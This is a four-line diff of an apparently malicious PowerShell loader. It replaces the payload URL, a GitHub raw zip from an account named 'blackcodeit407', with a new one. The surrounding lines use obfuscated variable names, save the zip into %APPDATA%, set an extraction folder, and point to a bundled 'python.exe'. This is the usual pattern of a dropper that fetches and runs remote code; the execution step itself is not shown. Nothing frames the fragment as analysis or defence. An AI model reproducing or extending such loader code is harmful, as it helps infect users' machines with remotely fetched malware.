@@ -1,4 +1,4 @@
-$ltrmn = 'https://github.com/blackcodeit407/system/blob/main/systems.zip?raw=true'
+$ltrmn = 'https://github.com/blackcodeit407/system/blob/main/system1.zip?raw=true'
 $kdsf = "$env:APPDATA\pzk.zip"
 $cwab = "$env:APPDATA\Extrac"
 $gqjd = Join-Path $cwab 'python.exe'
